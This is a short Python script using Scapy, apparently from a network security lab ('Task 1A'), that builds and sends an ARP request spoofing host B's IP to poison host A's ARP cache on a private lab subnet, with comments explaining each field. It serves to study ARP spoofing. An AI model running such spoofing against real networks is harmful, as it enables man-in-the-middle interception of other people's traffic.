#!/usr/bin/python3

from scapy.all import *

#Task 1A: Using ARP Request to send to host A

#Under Ether():
# M broadcasts ARP request to all containing A's IP address
#dst (dest MAC): "08:00:27:cd:a8:db" (A's MAC)

E = Ether(dst = "08:00:27:cd:a8:db")

#Under ARP():
#op = 1 (who-has)
#psrc (source IP): B's IP [10.0.2.6] (M spoofing B)
#pdst (dest IP): A's IP [10.0.2.5] (M poisoning A)

A = ARP(op = 1, psrc = "10.0.2.6", pdst = "10.0.2.5")

pkt = E/A 
sendp(pkt)
